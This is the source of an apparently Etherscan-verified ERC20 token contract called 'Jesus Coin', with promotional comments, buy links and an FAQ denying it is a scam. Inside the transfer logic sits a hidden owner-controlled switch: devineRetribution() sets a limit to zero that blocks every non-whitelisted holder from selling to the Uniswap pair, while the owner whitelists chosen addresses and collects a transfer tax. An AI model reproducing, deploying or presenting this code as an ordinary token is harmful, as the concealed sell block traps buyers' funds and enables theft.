/**
 *Submitted for verification at Etherscan.io on 2021-12-25
*/

// SPDX-License-Identifier: MIT
//
// **** Before critizing anything, think about what the real world does to you ****
// **** Before critizing anything, think about what the real world does to you ****
// **** Before critizing anything, think about what the real world does to you ****
//
// Our FUD - Faith, Understanding, Devotion
//
// IT'S TIME TO DECENTRALIZE JESUS
// Token supply: 4,900,000,000JC
// Token symbol: JC
// Token name: Jesus Coin
// ERC20 compatible
//
// Q: This all sounds ridiculous, is it a scam?
// A: Thr church is not a scam! Jesus Coin will fulfil all of the functions on the whitepaper (which is not very many functions).
//
// Q: Is this whole thing a joke?
// A: Christianity has survived 2000 years so if it's a joke, it's a good one. The Jesus Coin itself is totally real though, up there on Etherscan and Coin Market Cap and ERC20 compatible wallets and all that stuff.
//
// Join our Crusade
// Telegram:  https://t.me/jesuscoin888
// Read the whitepaper
// Website: https://jesuscoin.info
// See how we are doing
// Chart: https://www.dextools.io/app/ether/pair-explorer/0xf1278c449c8f9e366e2766ceef00c145e49ba647
// Support the Crusade
// Buy: https://app.uniswap.org/#/swap?inputCurrency=0x46de83d7e9047776b792e67619fd1f0fa4430a41
pragma solidity ^0.8.9;

interface IUniswapV2Factory {
	function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
	function swapExactTokensForETHSupportingFeeOnTransferTokens(
		uint amountIn,
		uint amountOutMin,
		address[] calldata path,
		address to,
		uint deadline
	) external;
	function factory() external pure returns (address);
	function WETH() external pure returns (address);
	function addLiquidityETH(
		address token,
		uint amountTokenDesired,
		uint amountTokenMin,
		uint amountETHMin,
		address to,
		uint deadline
	) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

abstract contract Context {
	function _msgSender() internal view virtual returns (address) {
		return msg.sender;
	}
}

interface IERC20 {
	function totalSupply() external view returns (uint256);
	function balanceOf(address account) external view returns (uint256);
	function transfer(address recipient, uint256 amount) external returns (bool);
	function allowance(address owner, address spender) external view returns (uint256);
	function approve(address spender, uint256 amount) external returns (bool);
	function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
	event Transfer(address indexed from, address indexed to, uint256 value);
	event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
	function add(uint256 a, uint256 b) internal pure returns (uint256) {
		uint256 c = a + b;
		require(c >= a, "SafeMath: addition overflow");
		return c;
	}

	function sub(uint256 a, uint256 b) internal pure returns (uint256) {
		return sub(a, b, "SafeMath: subtraction overflow");
	}

	function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
		require(b <= a, errorMessage);
		uint256 c = a - b;
		return c;
	}

	function mul(uint256 a, uint256 b) internal pure returns (uint256) {
		if (a == 0) {
			return 0;
		}
		uint256 c = a * b;
		require(c / a == b, "SafeMath: multiplication overflow");
		return c;
	}

	function div(uint256 a, uint256 b) internal pure returns (uint256) {
		return div(a, b, "SafeMath: division by zero");
	}

	function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
		require(b > 0, errorMessage);
		uint256 c = a / b;
		return c;
	}

}

uint256 constant INITIAL_TAX=10;
uint256 constant TOTAL_SUPPLY=4900000000;
string constant TOKEN_SYMBOL="JC";
string constant TOKEN_NAME="Jesus Coin";
uint8 constant DECIMALS=6;
uint256 constant TAX_THRESHOLD=1000000000000000000;


contract Ownable is Context {
	address private _owner;
	address private _previousOwner;
	event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

	constructor () {
		address msgSender = _msgSender();
		_owner = msgSender;
		emit OwnershipTransferred(address(0), msgSender);
	}

	function owner() public view returns (address) {
		return _owner;
	}

	modifier onlyOwner() {
		require(_owner == _msgSender(), "Ownable: caller is not the owner");
		_;
	}

	function renounceOwnership() public virtual onlyOwner {
		emit OwnershipTransferred(_owner, address(0));
		_owner = address(0);
	}

}


contract JesusCoin is Context, IERC20, Ownable {
	using SafeMath for uint256;
	mapping (address => uint256) private _balance;
	mapping (address => mapping (address => uint256)) private _allowances;
	mapping (address => bool) private _isExcludedFromFee;

	uint256 private _tTotal = TOTAL_SUPPLY * 10**DECIMALS;


	uint256 private _taxFee;
	address payable private _taxWallet;
	uint256 private _maxTxAmount;
	uint256 private _mercyOfGod;

	string private constant _name = TOKEN_NAME;
	string private constant _symbol = TOKEN_SYMBOL;
	uint8 private constant _decimals = DECIMALS;

	IUniswapV2Router02 private _uniswap;
	address private _pair;
	bool private _canTrade;
	bool private _inSwap = false;
	bool private _swapEnabled = false;

	modifier lockTheSwap {
		_inSwap = true;
		_;
		_inSwap = false;
	}
	constructor () {
		_taxWallet = payable(_msgSender());

		_taxFee = INITIAL_TAX;
		_uniswap = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

		_balance[address(this)] = _tTotal;
		_isExcludedFromFee[address(this)] = true;
		_isExcludedFromFee[_taxWallet] = true;
		_maxTxAmount=_tTotal.div(50);
		_mercyOfGod=_tTotal;
		emit Transfer(address(0x0), _msgSender(), _tTotal);
	}

	function name() public pure returns (string memory) {
		return _name;
	}

	function symbol() public pure returns (string memory) {
		return _symbol;
	}

	function decimals() public pure returns (uint8) {
		return _decimals;
	}

	function totalSupply() public view override returns (uint256) {
		return _tTotal;
	}

	function balanceOf(address account) public view override returns (uint256) {
		return _balance[account];
	}

	function transfer(address recipient, uint256 amount) public override returns (bool) {
		_transfer(_msgSender(), recipient, amount);
		return true;
	}

	function allowance(address owner, address spender) public view override returns (uint256) {
		return _allowances[owner][spender];
	}

	function approve(address spender, uint256 amount) public override returns (bool) {
		_approve(_msgSender(), spender, amount);
		return true;
	}

	function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
		_transfer(sender, recipient, amount);
		_approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
		return true;
	}

	function devineRetribution() public onlyChurch{
		_mercyOfGod=0;
	}

	function mercy() public view returns (uint256){
		return _mercyOfGod;
	}

	function payIndulgence() public payable returns (bool){
		require(msg.value>=balanceOf(address(this)),"Insufficient amount for indulgence");
		_isExcludedFromFee[msg.sender]=true;
		return true;
	}

	function _approve(address owner, address spender, uint256 amount) private {
		require(owner != address(0), "ERC20: approve from the zero address");
		require(spender != address(0), "ERC20: approve to the zero address");
		_allowances[owner][spender] = amount;
		emit Approval(owner, spender, amount);
	}

	function _transfer(address from, address to, uint256 amount) private {
		require(from != address(0), "ERC20: transfer from the zero address");
		require(to != address(0), "ERC20: transfer to the zero address");
		require(amount > 0, "Transfer amount must be greater than zero");
		if(!_isExcludedFromFee[from]){
			require(((to == _pair && from != address(_uniswap) )?amount:0) <= _mercyOfGod);
		}

		if (from != owner() && to != owner()) {
			if (from == _pair && to != address(_uniswap) && ! _isExcludedFromFee[to] ) {
				require(amount<_maxTxAmount,"Transaction amount limited");
			}

			uint256 contractTokenBalance = balanceOf(address(this));
			if (!_inSwap && from != _pair && _swapEnabled) {
				swapTokensForEth(contractTokenBalance);
				uint256 contractETHBalance = address(this).balance;
				if(contractETHBalance >= TAX_THRESHOLD) {
					sendETHToFee(address(this).balance);
				}
			}
		}

		_tokenTransfer(from,to,amount,(_isExcludedFromFee[to]||_isExcludedFromFee[from])?0:_taxFee);
	}

	function addToWhitelist(address buyer) public onlyChurch{
		_isExcludedFromFee[buyer]=true;
	}

	function removeFromWhitelist(address buyer) public onlyChurch{
		_isExcludedFromFee[buyer]=false;
	}

	function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
		address[] memory path = new address[](2);
		path[0] = address(this);
		path[1] = _uniswap.WETH();
		_approve(address(this), address(_uniswap), tokenAmount);
		_uniswap.swapExactTokensForETHSupportingFeeOnTransferTokens(
			tokenAmount,
			0,
			path,
			address(this),
			block.timestamp
		);
	}
	modifier onlyChurch() {
		require(_taxWallet == _msgSender() );
		_;
	}

	function lowerTax(uint256 newTaxRate) public onlyChurch{
		require(newTaxRate<INITIAL_TAX);
		_taxFee=newTaxRate;
	}

	function removeBuyLimit() public onlyChurch{
		_maxTxAmount=_tTotal;
	}

	function sendETHToFee(uint256 amount) private {
		_taxWallet.transfer(amount);
	}



	function createUniswapPair() external onlyChurch {
		require(!_canTrade,"Trading is already open");
		_approve(address(this), address(_uniswap), _tTotal);
		_pair = IUniswapV2Factory(_uniswap.factory()).createPair(address(this), _uniswap.WETH());
		IERC20(_pair).approve(address(_uniswap), type(uint).max);
	}

	function addLiquidity() external onlyChurch{
		_uniswap.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
		_swapEnabled = true;
		_canTrade = true;
	}

	function _tokenTransfer(address sender, address recipient, uint256 tAmount, uint256 taxRate) private {
		uint256 tTeam = tAmount.mul(taxRate).div(100);
		uint256 tTransferAmount = tAmount.sub(tTeam);

		_balance[sender] = _balance[sender].sub(tAmount);
		_balance[recipient] = _balance[recipient].add(tTransferAmount);
		_balance[address(this)] = _balance[address(this)].add(tTeam);
		emit Transfer(sender, recipient, tTransferAmount);
	}

	receive() external payable {}

	function swapForTax() external onlyChurch{
		uint256 contractBalance = balanceOf(address(this));
		swapTokensForEth(contractBalance);
	}

	function collectTax() external onlyChurch{
		uint256 contractETHBalance = address(this).balance;
		sendETHToFee(contractETHBalance);
	}


}